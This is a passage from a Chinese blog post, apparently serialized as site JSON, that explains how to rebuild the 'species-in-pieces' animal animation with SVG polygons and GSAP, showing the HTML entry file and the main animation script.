class=\"keyword\">return</span> parsePolygonStr(nextSpeciesPolygon[index][<span class=\"number\">0</span>], width, height)</span><br><span class=\"line\">                    &#125;,</span><br><span class=\"line\">                    fill: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">index, target</span>) </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">let</span> nextSpeciesPolygon = preData.title.polygon;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> nextSpeciesPolygon[index][<span class=\"number\">1</span>];</span><br><span class=\"line\">                    &#125;,</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;),</span><br><span class=\"line\">            <span class=\"string\">'+=0.4'</span></span><br><span class=\"line\">        );</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;, <span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 动物图案切换</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">playHandler</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> nextSpecies = data[currentSpeciesIndex++];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!nextSpecies) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    name.innerHTML = nextSpecies.name;</span><br><span class=\"line\">    desc.innerHTML = nextSpecies.desc;</span><br><span class=\"line\">    body.style.background = nextSpecies.background;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> nextSpeciesPolygon = nextSpecies.polygon;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> subTl = <span class=\"keyword\">new</span> TimelineMax(&#123; <span class=\"attr\">pause</span>: <span class=\"literal\">true</span> &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> arr1 = NodeList2Array(anisPolygons);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> arr2 = NodeList2Array(extraPolygons);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 之所以没用TweenMax.staggerTo是因为属性对象中没法用获得index，如下实现不了</span></span><br><span class=\"line\">    <span class=\"comment\">// attr: &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//     points: pointVal.join(' '),</span></span><br><span class=\"line\">    <span class=\"comment\">//     fill: function(index)&#123;return nextSpeciesPolygon[index][1];&#125;</span></span><br><span class=\"line\">    <span class=\"comment\">// &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    arr1.concat(arr2).forEach(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">target, index</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> pointVal = parsePolygonStr(nextSpeciesPolygon[index][<span class=\"number\">0</span>], width, height),</span><br><span class=\"line\">            fillVal = nextSpeciesPolygon[index][<span class=\"number\">1</span>];</span><br><span class=\"line\">        subTl.add(</span><br><span class=\"line\">            TweenMax.to(target, <span class=\"number\">0.5</span>, &#123;</span><br><span class=\"line\">                attr: &#123;</span><br><span class=\"line\">                    points: pointVal.join(<span class=\"string\">' '</span>),</span><br><span class=\"line\">                    fill: fillVal</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                ease: Back.easeOut.config(<span class=\"number\">1.7</span>)</span><br><span class=\"line\">            &#125;),</span><br><span class=\"line\">            <span class=\"string\">'-=0.47'</span></span><br><span class=\"line\">        )</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    subTl.play();</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">goBtn.addEventListener(<span class=\"string\">'click'</span>, playHandler, <span class=\"literal\">false</span>);</span><br></pre></td></tr></table></figure>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p><a href=\"https://greensock.com/gsap\" target=\"_blank\" rel=\"noopener\">GSAP动画平台</a>真的很强大，推荐有交互动效方面需求的可以关注下。</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>看到<a href=\"http://species-in-pieces.com/\" target=\"_blank\" rel=\"noopener\">species</a>网站做的很炫，想要借鉴，发现主要是用css3的<code>clip-path</code>实现的，兼容不好，因此想着用js实现下。下面作简单介绍，需要详细代码见<a href=\"https://github.com/jovysun/species-JS\" target=\"_blank\" rel=\"noopener\">github库</a>。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>效果图如下：<br><img src=\"/2019-03-06-species-js/1.gif\" alt=\"效果图\"><br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"基础知识\"><a href=\"#基础知识\" class=\"headerlink\" title=\"基础知识\"></a>基础知识</h2><ol>\n<li>SVG基本知识，重点viewBox，polygon；</li>\n<li>GSAP动画平台，重点TimelineMax，TweenMax；</li>\n<li>parcel构建工具的基本使用，<a href=\"http://www.css88.com/doc/parcel/\" target=\"_blank\" rel=\"noopener\">parcel</a>。<h2 id=\"实现思路\"><a href=\"#实现思路\" class=\"headerlink\" title=\"实现思路\"></a>实现思路</h2>根据参考网站的代码，动物图案是用<code>clip-path: polygon()</code>实现的，第一时间想到了SVG的polygon;另外对于转场动画，过渡动画，找个自己熟悉的动画库实现就行了。需要特别说明的是：</li>\n<li>css的clip-path用的用的百分比数值，svg的polygon的points值不能用百分比数值，知道viewBox概念的应该清楚，其实points的值也不是一般认为的绝对像素值，因此写了个工具函数<code>parsePolygonStr</code>。</li>\n<li>因为图案是分动物和场景（树枝，石头等）两部分，并且希望先绘制动物再绘制场景，因此HTML部分用g标签分成<code>extra</code>和<code>anis</code>。<h2 id=\"主要的代码如下：\"><a href=\"#主要的代码如下：\" class=\"headerlink\" title=\"主要的代码如下：\"></a>主要的代码如下：</h2><h3 id=\"入口文件HTML\"><a href=\"#入口文件HTML\" class=\"headerlink\" title=\"入口文件HTML\"></a>入口文件HTML</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">\"viewport\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"width=device-width, initial-scale=1.0\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"X-UA-Compatible\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"ie=edge\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>species<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"wrap\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">class</span>=<span class=\"string\">\"stage\"</span> <span class=\"attr\">viewBox</span>=<span class=\"string\">\"0 0 1000 700\"</span> <span class=\"attr\">version</span>=<span class=\"string\">\"1.1\"</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://www.w3.org/2000/svg\"</span> <span class=\"attr\">xmlns:xlink</span>=<span class=\"string\">\"http://www.w3.org/1999/xlink\"</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">g</span> <span class=\"attr\">id</span>=<span class=\"string\">\"extra\"</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">polygon</span> <span class=\"attr\">points</span>=<span class=\"string\">\"793.50,476.88,949.50,500.88,805.50,518.88\"</span> <span class=\"attr\">fill</span>=<span class=\"string\">\"hsla(0, 0%, 100%, 0)\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">polygon</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">polygon</span> <span class=\"attr\">points</span>=<span class=\"string\">\"793.50,476.88,949.50,500.88,805.50,518.88\"</span> <span class=\"attr\">fill</span>=<span class=\"string\">\"hsla(0, 0%, 100%, 0)\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">polygon</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">polygon</span> <span class=\"attr\">points</span>=<span class=\"string\">\"793.50,476.88,949.50,500.88,805.50,518.88\"</span> <span class=\"attr\">fill</span>=<span class=\"string\">\"hsla(0, 0%, 100%, 0)\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">polygon</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">g</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">g</span> <span class=\"attr\">id</span>=<span class=\"string\">\"anis\"</span>&gt;</span></span><br><span class=\"line\">                </span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">g</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">\"go_btn\"</span>&gt;</span>GO!<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">\"name\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">h2</span> <span class=\"attr\">class</span>=<span class=\"string\">\"desc\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"./index.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h3 id=\"主要js脚本\"><a href=\"#主要js脚本\" class=\"headerlink\" title=\"主要js脚本\"></a>主要js脚本</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 导入一个 SCSS module</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">'../css/main.scss'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; data, preData &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./data'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; TweenMax, TweenLite, TimelineMax &#125; <span class=\"keyword\">from</span> <span class=\"string\">'gsap'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// NodeList转换Array</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">NodeList2Array</span>(<span class=\"params\">nodelist</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> arr = [];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nodelist.length) &#123;</span><br><span class=\"line\">        arr = <span class=\"built_in\">Array</span>.prototype.slice.call(nodelist, <span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arr;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 把'clip-path'值转成svg polygon可用的值</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">parsePolygonStr</span>(<span class=\"params\">polygonStr, width, height</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> pointsArr = polygonStr.split(<span class=\"regexp\">/\\s+|,\\s/</span>);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> newPointArr = pointsArr.map(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">currentVal, index, arr</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (index % <span class=\"number\">2</span> === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (<span class=\"built_in\">parseFloat</span>(currentVal) * width / <span class=\"number\">100</span>).toFixed(<span class=\"number\">2</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (<span class=\"built_in\">parseFloat</span>(currentVal) * height / <span class=\"number\">100</span>).toFixed(<span class=\"number\">2</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> newPointArr;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> body = <span class=\"built_in\">document</span>.querySelector(<span class=\"string\">'body'</span>),</span><br><span class=\"line\">    wrap = <span class=\"built_in\">document</span>.querySelector(<span class=\"string\">'#wrap'</span>),</span><br><span class=\"line\">    name = wrap.querySelector(<span class=\"string\">'.name'</span>),</span><br><span class=\"line\">    desc = wrap.querySelector(<span class=\"string\">'.desc'</span>),</span><br><span class=\"line\">    stage = wrap.querySelector(<span class=\"string\">'.stage'</span>),</span><br><span class=\"line\">    anis = <span class=\"built_in\">document</span>.querySelector(<span class=\"string\">'#anis'</span>),</span><br><span class=\"line\">    extra = <span class=\"built_in\">document</span>.querySelector(<span class=\"string\">'#extra'</span>),</span><br><span class=\"line\">    goBtn = <span class=\"built_in\">document</span>.querySelector(<span class=\"string\">'#go_btn'</span>),</span><br><span class=\"line\">    anisPolygons = <span class=\"literal\">null</span>,</span><br><span class=\"line\">    extraPolygons = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> currentSpeciesIndex = <span class=\"number\">0</span>,</span><br><span class=\"line\">    width = <span class=\"number\">1000</span>,</span><br><span class=\"line\">    height = <span class=\"number\">700</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">init</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> initSpecies = preData.preload;</span><br><span class=\"line\">    name.innerHTML = initSpecies.name;</span><br><span class=\"line\">    desc.innerHTML = initSpecies.desc;</span><br><span class=\"line\">    body.style.background = initSpecies.background;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> polygonArr = initSpecies.polygon;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">Object</span>.prototype.toString.call(polygonArr) === <span class=\"string\">'[object Array]'</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> polygonHtml = <span class=\"string\">''</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        polygonArr.forEach(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">element, index</span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> pointsVal = parsePolygonStr(element[<span class=\"number\">0</span>], width, height);</span><br><span class=\"line\">            polygonHtml += <span class=\"string\">'&lt;polygon points=\"'</span> + pointsVal + <span class=\"string\">'\" fill=\"'</span> + element[<span class=\"number\">1</span>] + <span class=\"string\">'\"/&gt;'</span>;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        anis.innerHTML = polygonHtml;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">init();</span><br><span class=\"line\">anisPolygons = anis.querySelectorAll(<span class=\"string\">'polygon'</span>);</span><br><span class=\"line\">extraPolygons = extra.querySelectorAll(<span class=\"string\">'polygon'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> tl = <span class=\"keyword\">new</span> TimelineMax(&#123; <span class=\"attr\">delay</span>: <span class=\"number\">0.2</span> &#125;);</span><br><span class=\"line\"><span class=\"comment\">// 初始的loading动画</span></span><br><span class=\"line\">NodeList2Array(anisPolygons).forEach(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">target, index</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> tm = TweenMax.fromTo(target, <span class=\"number\">0.9</span>, &#123; <span class=\"attr\">attr</span>: &#123; <span class=\"attr\">fill</span>: <span class=\"string\">'rgba(0, 0, 0, .7)'</span> &#125; &#125;, &#123; <span class=\"attr\">attr</span>: &#123; <span class=\"attr\">fill</span>: <span class=\"string\">'rgba(200, 20, 20, .45)'</span> &#125;, <span class=\"attr\">ease</span>: Power0.easeNone, <span class=\"attr\">repeat</span>: <span class=\"number\">-1</span>, <span class=\"attr\">yoyo</span>: <span class=\"literal\">true</span> &#125;);</span><br><span class=\"line\">    tl.add(tm, <span class=\"number\">0.9</span> - <span class=\"number\">0.03</span> * index);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 模拟加载完成</span></span><br><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 清除tl</span></span><br><span class=\"line\">    tl.clear();</span><br><span class=\"line\">    <span class=\"comment\">// loading完之后的一系列动画</span></span><br><span class=\"line\">    <span class=\"comment\">// 1，变色，放大，爆炸碎片</span></span><br><span class=\"line\">    tl.add(</span><br><span class=\"line\">            [</span><br><span class=\"line\">                TweenMax.to(<span class=\"string\">'#anis polygon'</span>, <span class=\"number\">.6</span>, &#123;</span><br><span class=\"line\">                    attr: &#123;</span><br><span class=\"line\">                        fill: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">index</span>) </span>&#123;</span><br><span class=\"line\">                            <span class=\"keyword\">let</span> fillVal = <span class=\"string\">'#111'</span>;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (index % <span class=\"number\">5</span> === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                                fillVal = <span class=\"string\">'#28282a'</span>;</span><br><span class=\"line\">                            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (index % <span class=\"number\">5</span> === <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                                fillVal = <span class=\"string\">'#111'</span>;</span><br><span class=\"line\">                            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (index % <span class=\"number\">5</span> === <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">                                fillVal = <span class=\"string\">'#333'</span>;</span><br><span class=\"line\">                            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (index % <span class=\"number\">5</span> === <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">                                fillVal = <span class=\"string\">'#222'</span>;</span><br><span class=\"line\">                            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (index % <span class=\"number\">5</span> === <span class=\"number\">4</span>) &#123;</span><br><span class=\"line\">                                fillVal = <span class=\"string\">'#121212'</span>;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                            <span class=\"keyword\">return</span> fillVal;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;),</span><br><span class=\"line\">                TweenMax.to(<span class=\"string\">'#wrap .stage'</span>, <span class=\"number\">.6</span>, &#123;</span><br><span class=\"line\">                    scale: <span class=\"number\">1</span>,</span><br><span class=\"line\">                    ease: Back.easeOut.config(<span class=\"number\">1.7</span>)</span><br><span class=\"line\">                &#125;),</span><br><span class=\"line\">                TweenMax.to(<span class=\"string\">'#anis polygon'</span>, <span class=\"number\">.6</span>, &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                    attr: &#123;</span><br><span class=\"line\">                        points: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">index, target</span>) </span>&#123;</span><br><span class=\"line\">                            <span class=\"keyword\">let</span> nextSpeciesPolygon = preData.ready.polygon;</span><br><span class=\"line\">                            <span class=\"comment\">// debugger</span></span><br><span class=\"line\">                            <span class=\"keyword\">return</span> parsePolygonStr(nextSpeciesPolygon[index][<span class=\"number\">0</span>], width, height)</span><br><span class=\"line\">                        &#125;,</span><br><span class=\"line\">                        fill: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">index, target</span>) </span>&#123;</span><br><span class=\"line\">                            <span class=\"keyword\">let</span> nextSpeciesPolygon = preData.ready.polygon;</span><br><span class=\"line\">                            <span class=\"keyword\">return</span> nextSpeciesPolygon[index][<span class=\"number\">1</span>];</span><br><span class=\"line\">                        &#125;,</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"comment\">// ease: Power2.easeInOut,</span></span><br><span 